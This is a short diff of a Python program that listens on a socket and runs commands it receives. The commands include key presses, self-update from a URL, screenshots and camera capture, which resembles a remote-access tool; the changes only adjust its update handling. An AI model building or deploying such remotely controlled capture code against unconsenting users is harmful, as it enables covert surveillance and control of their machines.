@@ -106,6 +106,7 @@ def stopall():
     subprocess.Popen(getFileName(), shell=True)
     
 def multipro():
+    # example
     if __name__ == "__main__":
         p = Process(target=stopall)
         p.daemon = True
@@ -117,7 +118,7 @@ def importImg(data):
     urllib.request.urlretrieve(data, "Image.jpg")
 
 def execute(data):
-    global run, sortir, ossys
+    global run, sortir, ossys, reloading
     datalist = data.split()
     if data == "die":
         run = False
@@ -128,11 +129,13 @@ def execute(data):
     elif data[0:6] == "press(":
         press(data[6:len(data) - 1])
     elif data == "update":
-        modif.update(url)
-        ossys, sortir = True, True
+        temp = modif.update(url)
+        if temp == True:
+            ossys, sortir = True, True
     elif data =="updelte":
-        modif.update(url, delete=True)
-        ossys, sortir = True, True
+        temp = modif.update(url, delete=True)
+        if temp == True:   
+            ossys, sortir = True, True
     elif data == "screen":
         screen()
     elif data == "camera":
@@ -171,6 +174,8 @@ while run == True:
             print("reload")
             stopall()
             exit()
+        else:
+            ossys = False
         server.bind((ip, port))
         server.listen()
         
